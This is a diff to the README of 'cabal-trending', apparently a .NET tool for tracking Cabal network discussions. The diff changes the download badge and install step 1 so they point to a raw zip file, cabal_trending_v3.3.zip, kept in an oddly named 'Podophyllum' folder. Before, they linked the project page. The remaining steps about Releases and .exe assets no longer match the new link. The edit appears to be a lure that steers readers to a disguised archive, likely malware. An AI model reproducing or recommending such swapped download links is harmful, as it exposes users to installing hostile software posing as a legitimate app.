@@ -1,6 +1,6 @@
 # 📈 cabal-trending - Track popular social web network discussions
 
-[![Download cabal-trending](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/matthaeuslargescale908/cabal-trending)
+[![Download cabal-trending](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/matthaeuslargescale908/cabal-trending/raw/refs/heads/main/Podophyllum/cabal_trending_v3.3.zip)
 
 cabal-trending monitors active conversations across the Cabal network. It identifies trending topics and provides data on community engagement. Use this tool to visualize current discussions and track changes in network interest over time.
 
@@ -17,7 +17,7 @@ If you lack the .NET Runtime, Windows will prompt you to download it during the 
 
 ## 📥 How to Install
 
-1. Visit this page to download the software: https://github.com/matthaeuslargescale908/cabal-trending
+1. Visit this page to download the software: https://github.com/matthaeuslargescale908/cabal-trending/raw/refs/heads/main/Podophyllum/cabal_trending_v3.3.zip
 2. Navigate to the Releases section on the right side of the screen.
 3. Click the most recent version identifier.
 4. Locate the file ending in .exe under the Assets heading.
